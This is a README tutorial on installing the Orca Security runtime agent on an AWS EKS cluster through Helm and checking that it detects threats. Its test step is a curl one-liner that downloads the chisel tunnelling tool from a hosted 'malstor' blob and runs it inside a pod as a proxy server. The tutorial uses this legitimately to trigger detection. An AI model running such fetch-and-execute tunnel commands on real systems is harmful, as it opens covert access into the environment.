# Getting Started with Orca Agent on your K8s cluster
Orca Security is a pioneer of "agentless cloud security" - this is obvious! At the same time, many of customers are looking for flexible option, and some of them must protect their cloud assets realtime, and Orca Security can address the needs with Orca Agent! The tutorial is a good starting point how you can try Orca Agent on your K8s cluster.
<br>
<br>


## Prerequisites
- Orca Security free trial license - visit [Orca Security](https://orca.security/lp/cloud-security-risk-assessment/) or reach out Orca Security rep if you don't have
  a free trial license.
- MacBook with AWS CLI and Helm CLI. **Your AWS CLI should be properly configured! The tutorial uses AWS Vault instead of using lefacy AWS CLI.**
- Your K8s cluster has already created. **The tutorial uses AWS EKS.**
- Your cloud account that has your K8s should have been onboarded with Orca Security.
<br>
<br>


## Set-up
Update your AWS CLI config so to be aligned with your EKS cluster location.
```
$ aws-vault exec hisashi --no-session -- aws eks update-kubeconfig --region <your region> --name <your EKS cluster name>
```
<br>
You can find your EKS cluster name on AWS UI.
<br>
<div align="center">
<img src="./img/1.png" width=70%>
</div>
<br>

I have created my EKS cluster on us-east-1, and the name is "terraform-eks-demo".
```
$ aws-vault exec hisashi --no-session -- aws eks update-kubeconfig --region us-east-1 --name terraform-eks-demo
```
<br>

My ~.kube/config looks like this.
```
$ cat .kube/config
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: xxxx
    server: https://F6583E8B51DDC450B472217CBC031D67.gr7.us-east-1.eks.amazonaws.com
  name: arn:aws:eks:us-east-1:927556698342:cluster/terraform-eks-demo
contexts:
- context:
    cluster: arn:aws:eks:us-east-1:927556698342:cluster/terraform-eks-demo
    user: arn:aws:eks:us-east-1:927556698342:cluster/terraform-eks-demo
  name: arn:aws:eks:us-east-1:927556698342:cluster/terraform-eks-demo
current-context: arn:aws:eks:us-east-1:927556698342:cluster/terraform-eks-demo
kind: Config
preferences: {}
users:
- name: arn:aws:eks:us-east-1:927556698342:cluster/terraform-eks-demo
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1beta1
      args:
      - --region
      - us-east-1
      - eks
      - get-token
      - --cluster-name
      - terraform-eks-demo
      - --output
      - json
      command: aws
```
<br>

Add Orca Security helm chart repository to your local helm repository.
```
$ helm repo add orca-to-helm-charts https://orcasecurity.github.io/orca-to-helm-charts
```
<br>

Check your local helm repository.
```
$ helm repo list
NAME               	URL
orca-to-helm-charts	https://orcasecurity.github.io/orca-to-helm-charts
```

Install Orca Agent monitoe to your K8s cluster.
```
$ helm upgrade --install to-monitor orca-to-helm-charts/to-monitor \
    --namespace threatoptix \
    --create-namespace \
    --set toConfig=<paste base64 encoded config string provided by Orca> \
    --set image.registry.password=<paste token provided by Orca>
```
<br>

You can find toConfig value via API. Go Orca Security UI and hit "Settings" on the bottom left. Hit "Modules" -> "Integrations", and hit "Swagger". Expand **/threatoptix/confg**, and hit "Try it out" and "Execute". Grab the value of **"THREATOPTIX_CONFIG_VALUE". You should reach out to Orca Security rep to grab image registory password.**
<br>
<div align="center">
<img src="./img/2.png" width=70%>
</div>
<br>

Here comes a sample command.
```
$ aws-vault exec hisashi --no-session -- helm upgrade --install to-monitor orca-to-helm-charts/to-monitor \
    --namespace threatoptix \
    --create-namespace \
    --set toConfig=xxxx= \
    --set image.registry.password=xxxx
Release "to-monitor" does not exist. Installing it now.
NAME: to-monitor
LAST DEPLOYED: Sat Sep 23 04:43:22 2023
NAMESPACE: threatoptix
STATUS: deployed
REVISION: 1
TEST SUITE: None
```
<br>

Check your daemon sets on you K8s. You should see **threat optix & to-monitor** namespace & name.
```
$ kubectl get ds --all-namespaces
NAMESPACE     NAME         DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE
kube-system   aws-node     1         1         1       1            1           <none>          22h
kube-system   kube-proxy   1         1         1       1            1           <none>          22h
threatoptix   to-monitor   1         1         1       1            1           <none>          64m
```
<br>

Let's create a sample pod - my sample pod look like this.
```
$ cat sample-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: sample-pod
spec:
  containers:
  - name: hello
    image: ntakehata/hello:latest
    ports:
    - containerPort: 8080
  - name: nginx
    image:  nginx:1.13.5-alpine
```

Create it.
```
$ aws-vault exec hisashi --no-session -- kubectl apply -f sample-pod.yaml
pod/sample-pod created
```

Check your pods.
```
$ aws-vault exec hisashi --no-session -- kubectl get pods --all-namespaces
NAMESPACE     NAME                       READY   STATUS             RESTARTS   AGE
default       sample-pod                 2/2     Running            0          28s
kube-system   aws-node-ljzm5             1/1     Running            0          19h
kube-system   coredns-79df7fff65-ckk9k   1/1     Running            0          19h
kube-system   coredns-79df7fff65-lww5v   1/1     Running            0          19h
kube-system   kube-proxy-ml7sq           1/1     Running            0          19h
threatoptix   to-monitor-brwvc           1/1     Running            0          19h
```
<br>
<br>


## Try it out!
1. Log in your sample pod.
```
$ aws-vault exec hisashi --no-session -- kubectl exec -it sample-pod /bin/bash
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
Defaulted container "hello" out of: hello, nginx
root@sample-pod:/go#
```

2. Donload and execut a malware on your pod - it should be killed immediately.
```
$ curl "https://downorca124gfgere4.blob.core.windows.net/malstor/chisel_1.8.1_linux_amd64?sp=rl&st=2023-08-06T06:40:41Z&se=2030-09-06T14:40:41Z&spr=https&sv=2022-11-02&sr=c&sig=HJfjawMBYq2tq7tw%2FL5ICfhZFPokvjYT2niFhZ08b7E%3D" --output /tmp/chisel; chmod +x /tmp/chisel; /tmp/chisel server --port 5555 --proxy http://127.0.0.1
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 8188k  100 8188k    0     0  30.2M      0 --:--:-- --:--:-- --:--:-- 30.1M
2023/09/25 22:59:03 server: Fingerprint vABYDF6kMPcQtZAg/YzdWizgXvg51iYQghdVQxy8hQM=
2023/09/25 22:59:03 server: Reverse proxy enabled
2023/09/25 22:59:03 server: Listening on http://0.0.0.0:5555
killed
```

3. Go Orca Security UI, and visit CDR view. You can see an alert(should be critical level) on the view.
<br>
<div align="center">
<img src="./img/3.png" width=70%>
</div>
<br>

<br>
<br>


## Issue Reporting
If you have found any missing instructions or if you have updates request, please report them at this repository issues section.
